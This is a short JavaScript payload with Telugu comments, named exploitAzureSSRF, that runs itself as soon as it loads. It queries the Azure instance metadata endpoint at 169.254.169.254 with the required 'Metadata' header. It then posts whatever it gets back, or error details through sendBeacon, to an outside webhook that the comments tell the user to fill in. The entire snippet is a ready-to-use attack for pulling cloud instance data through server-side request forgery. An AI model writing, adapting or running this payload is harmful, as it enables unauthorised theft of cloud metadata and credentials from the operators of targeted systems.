(function() {
    // నీ వెబ్‌హుక్ యుఆర్ఎల్ ఇక్కడ ఇవ్వు
    const webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";

    async function exploitAzureSSRF() {
        // Azure Metadata Service URL
        const metadataUrl = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
        
        try {
            const response = await fetch(metadataUrl, {
                method: 'GET',
                headers: {
                    'Metadata': 'true' // ఇది చాలా ముఖ్యం, లేకపోతే Azure రిజెక్ట్ చేస్తుంది
                }
            });

            if (response.ok) {
                const data = await response.json();
                // దొరికిన డేటాని నీ వెబ్‌హుక్‌కి పంపడం
                fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        status: "SSRF_SUCCESS",
                        source: "Azure_Internal_Metadata",
                        payload: data
                    })
                });
            } else {
                navigator.sendBeacon(webhook + "?status=METADATA_HIT_BUT_FAILED&code=" + response.status);
            }
        } catch (e) {
            // ఒకవేళ డైరెక్ట్ ఫెచ్ బ్లాక్ అయితే బీకాన్ ద్వారా ఎర్రర్ పంపడం
            navigator.sendBeacon(webhook + "?status=SSRF_ATTEMPTED_ERROR&msg=" + btoa(e.message));
        }
    }

    // వెంటనే ఎగ్జిక్యూట్ చేయడం
    exploitAzureSSRF();
})();
